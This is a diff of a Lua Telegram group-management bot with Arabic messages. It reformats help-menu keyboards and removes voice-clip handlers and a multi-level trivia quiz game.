+{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
+},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -16492,10 +16483,18 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"}},
-{{text = '⌯ ❸❸ ⌯', callback_data="/help"},{text = '❹❹', callback_data="/help6"}},
-{{text = 'اوامر التسليه', callback_data="/help7"}},
-{{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"}},
+{
+{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
+},
+{
+{text = '⌯ ❸❸ ⌯', callback_data="/help"},{text = '❹❹', callback_data="/help6"},
+},
+{
+{text = 'اوامر التسليه', callback_data="/help7"},
+},
+{
+{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
+},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -16537,14 +16536,22 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"}},
-{{text = '❸❸', callback_data="/help5"},{text = '⌯ ❹❹ ⌯', callback_data="/help"}},
-{{text = 'اوامر التسليه', callback_data="/help7"}},
-{{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"}},
+{
+{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
+},
+{
+{text = '❸❸', callback_data="/help5"},{text = '⌯ ❹❹ ⌯', callback_data="/help"},
+},
+{
+{text = 'اوامر التسليه', callback_data="/help7"},
+},
+{
+{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
+},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
-if Text == '/help7' then
+if Text == '/help7' or text == 'الاوامر' then
 if not Mod(data) then
 local notText = '🚫 عذرا الاوامر هذه لا تخصك'
 https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
@@ -16603,10 +16610,18 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"}},
-{{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"}},
-{{text = '⌯ اوامر التسليه ⌯', callback_data="/help"}},
-{{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"}},
+{
+{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
+},
+{
+{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
+},
+{
+{text = '⌯ اوامر التسليه ⌯', callback_data="/help"},
+},
+{
+{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
+},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -16623,10 +16638,18 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"}},
-{{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"}},
-{{text = 'اوامر التسليه', callback_data="/help7"}},
-{{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"}},
+{
+{text = '❶️❶', callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
+},
+{
+{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
+},
+{
+{text = 'اوامر التسليه', callback_data="/help7"},
+},
+{
+{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
+},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -16735,32 +16758,7 @@ keyboard.inline_keyboard = {
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
-if Text == "/voice1" then
-data,res = https.request('https://black-source.tk/BlackTeAM/audios.php')
-if res == 200 then
-audios = json:decode(data)
-if audios.Info == true then
-local Text ='☉┇ تم اختيار المقطع الصوتي لك'
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = 'مقطع اخر.',callback_data="/voice2"}},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end end end
-if Text == "/voice2" then
-data,res = https.request('https://black-source.tk/BlackTeAM/audios.php')
-if res == 200 then
-audios = json:decode(data)
-if audios.Info == true then
-local Text ='☉┇ تم اختيار المقطع الصوتي لك'
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = 'مقطع اخر.',callback_data="/voice1"}},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end end end
+
 if Text == '/mute-name' then
 if not Constructor(data) then
 local notText = '🚫 عذرا الاوامر هذه لا تخصك'
@@ -16918,1503 +16916,6 @@ keyboard.inline_keyboard = {
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
 --- callback added
-if Text == "melinfo" then
-local Text =[[
-لعبه الاساله {من سيربح المليون}
-اللعبه مقسمه الي 3 مستويات
-تصل الي المستوي الثاني بعد السؤال رقم 21
-و تصل الي المستوي الثالث بعد السؤال رقم 41
-و هنا تبدا الصعوبه
-و للعبه للاذكياء فقط اذا كنت غبيا لا تلعب
-اضغط في الاسفل لي بدء اللعب و ركذ جيدا
-•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•
-#ملاحظه_تم_عمل_اللعبه_لاول_مرا_بواسطه_سونك_بلغه_php
-#ثم_تم_عملها_مرا_اخري_بواسطه_أحمد_عياد_يلغه_lua
-لي سهوله استخدامها و جعلها اسرع في الاستجابه
-AHMED @ahmedyad200
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "ابدء اللعب" callback_data="mel1"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "✖" then
-local Text =[[
-ابد من جديد خسرت يا بطل 😭
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "ابدء مجددا" callback_data="mel1"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "❌" then
-local Text =[[
-ابد من جديد خسرت يا بطل 😭
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "ابدء مجددا" callback_data="mel1"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel1" then
-local Text =[[
-• ما هي عاصمه مصر ؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = " دمياط " callback_data="✖"}},
-{{text = "الاسكندريه " callback_data="❌"}},
-{{text = "القاهره " callback_data="mel2"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel2" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel3"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel3" then
-local Text =[[
-• كم ساعة في اليوم الواحد؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "23 " callback_data="✖"}},
-{{text = "24 " callback_data="mel4"}},
-{{text = "22 " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel4" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel5"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel5" then
-local Text =[[
-• ما هو اسم بيت النحل؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "بيت " callback_data="✖"}},
-{{text = "غصن " callback_data="❌"}},
-{{text = "خليه" callback_data="mel7"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel7" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel8"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel8" then
-local Text =[[
-• ما الاسم الحالي لمدينه القسطنطينيه؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "اسطنبول " callback_data="mel9"}},
-{{text = "دمشق " callback_data="✖"}},
-{{text = "القاهره " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel9" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel10"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel10" then
-local Text =[[
-• ما هو نظام الحكم الحالي في اليابان؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الجمهوري " callback_data="✖"}},
-{{text = "الامبراطوري " callback_data="mel11"}},
-{{text = "الملكي " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel11" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel12"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel12" then
-local Text =[[
-• أي من كواكب المجموعة الشمسية يطلق عليه اسم الكوكب الأحمر؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الارض  " callback_data="✖"}},
-{{text = "المشتري " callback_data="❌"}},
-{{text = "المريخ " callback_data="mel13"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel13" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel14"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel14" then
-local Text =[[
-• اذكر اسم السورة القرآنية التي تعادل ربع القرآن؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = " الكوثر " callback_data="✖"}},
-{{text = "الاخلاص " callback_data="❌"}},
-{{text = "الكافرون " callback_data="mel15"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel15" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel17"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel17" then
-local Text =[[
-• ما هو الحيوان الأثقل وزناً في العالم؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الفيل " callback_data="✖"}},
-{{text = "الحوت الازرق " callback_data="mel18"}},
-{{text = "الجمل " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel18" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel19"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel19" then
-local Text =[[
-• كم مرة تستطيع إناث القطط أن تنجب سنوياً؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "ثلاث مرات " callback_data="mel21"}},
-{{text = "مرتين " callback_data="✖"}},
-{{text = "خمس مرات " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel21" then
-local Text =[[
-• من هو أول شعب استخدم ساعة اليد؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الشعب الامريكي " callback_data="✖"}},
-{{text = "الشعب البريطاني " callback_data="mel22"}},
-{{text = "الشعب الصيني " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel22" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel23"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel23" then
-local Text =[[
-• من هو الملك الذي قام بتأسيس المملكة العربية السعودية؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الملك سعود ." callback_data="✖"}},
-{{text = "الملك عبد العزيز بن سعود. " callback_data="mel24"}},
-{{text = "الملك فيصل " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel24" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel25"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel25" then
-local Text =[[
-• ما هي عمله بولندا؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الروبن ." callback_data="✖"}},
-{{text = "الدينار " callback_data="❌"}},
-{{text = "الزلوط ." callback_data="mel26"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel26" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel27"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel27" then
-local Text =[[
-• أي من الدول العربية يمر خط الأستواء بها؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "مصر. " callback_data="✖"}},
-{{text = "الصومال " callback_data="mel28"}},
-{{text = "العراق " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel28" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel29"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel29" then
-local Text =[[
-• ما هي عمله مصر ؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الدينار." callback_data="✖"}},
-{{text = "الريال " callback_data="❌"}},
-{{text = "الجنيه." callback_data="mel30"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel30" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel31"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel31" then
-local Text =[[
-• من هو رئيس مصر الحالي؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "مرسي ." callback_data="✖"}},
-{{text = "السيسي." callback_data="mel32"}},
-{{text = "مبارك" callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel32" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel34"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel34" then
-local Text =[[
-• كم عدد أيام السنة الكبيسة؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "360 يوم ." callback_data="✖"}},
-{{text = "366 يوم" callback_data="mel35"}},
-{{text = "364 يوم." callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel35" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel36"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel36" then
-local Text =[[
-• في أي دولة تم لأول مرة صناعة كسوة الكعبة؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "العراق." callback_data="✖"}},
-{{text = "السعوديه " callback_data="❌"}},
-{{text = "مصر." callback_data="mel37"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel37" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel38"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel38" then
-local Text =[[
- • ماهي المدينة التي لُقبت بمدينة التلال السبعة؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "لندن ." callback_data="✖"}},
-{{text = "روما." callback_data="mel39"}},
-{{text = "طوكيو " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel39" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel40"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel40" then
-local Text =[[
-•كم عدد العضلات التي يستخدمها الإنسان عند التكلم؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "٥٥ عضله ." callback_data="✖"}},
-{{text = "٣٣ عضله " callback_data="❌"}},
-{{text = "٤٤ عضله." callback_data="mel41"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel41" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel42"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel42" then
-local Text =[[
-خلصت المستوى الاول
-الحين وصلت المستوى الثاني💞
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "ابدء المستوي الثاني " callback_data="mel43"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel43" then
-local Text =[[
- • أول صلاة قام بها الرسول عليه الصلاة والسلام؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "صلاة الفجر ." callback_data="✖"}},
-{{text = "صلاة الظهر ." callback_data="mel44"}},
-{{text = "صلاة العصر " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel44" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel45"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-if Text == "mel45" then
-local Text =[[
- • مادة معينة تشكل الشعر والجلد والأظافر دون مناطق الجسم الأخرى؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الكيراتين " callback_data="mel46"}},
-{{text = "البروتين " callback_data="✖"}},
-{{text = "النيترانين " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel46" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel47"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel47" then
-local Text =[[
- • في أي مكان من الجسم يبدأ هضم الكربوهيدرات؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "في الفم " callback_data="mel48"}},
-{{text = "المعده " callback_data="✖"}},
-{{text = "البنكرياس " callback_data="❌"}},
-}
